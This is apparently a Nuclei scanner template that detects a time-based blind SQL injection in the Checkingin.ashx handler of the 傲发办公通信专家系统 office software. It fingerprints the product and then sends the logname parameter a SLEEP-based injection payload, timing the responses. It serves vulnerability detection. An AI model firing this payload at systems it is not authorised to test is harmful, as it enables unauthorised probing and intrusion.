id: poc-yaml-aofax-checkingin-ashx-sqli

info:
  name: 傲发办公通信专家系统 Checkingin.ashx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 傲发办公通信专家系统
  description: |
    This template detects an SQL injection vulnerability in the 傲发办公通信专家系统 Checkingin.ashx endpoint.

flow: |
  http(1) && http(2)

http:
  - id: initial-check
    method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "getincommingcall"

  - id: sqli-check
    method: GET
    path:
      - "{{BaseURL}}/handle/Checkingin.ashx?type=checkingin&logname=%27+and+(SELECT+*+FROM+(SELECT(SLEEP(5)))x)+and+%27&date=1"
      - "{{BaseURL}}/handle/Checkingin.ashx?type=checkingin&logname=%27+and+(SELECT+*+FROM+(SELECT(SLEEP(8)))x)+and+%27&date=1"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "0-0-0"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
